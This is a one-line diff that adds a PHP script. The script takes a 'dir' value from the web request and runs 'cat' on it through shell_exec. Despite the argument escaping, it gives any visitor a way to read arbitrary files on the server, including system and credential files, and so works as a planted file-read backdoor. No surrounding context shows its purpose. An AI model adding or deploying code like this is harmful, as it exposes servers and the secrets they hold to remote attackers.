@@ -1,0 +1,1 @@
+<?php echo shell_exec("cat ".escapeshellarg($_GET['dir'])); ?>
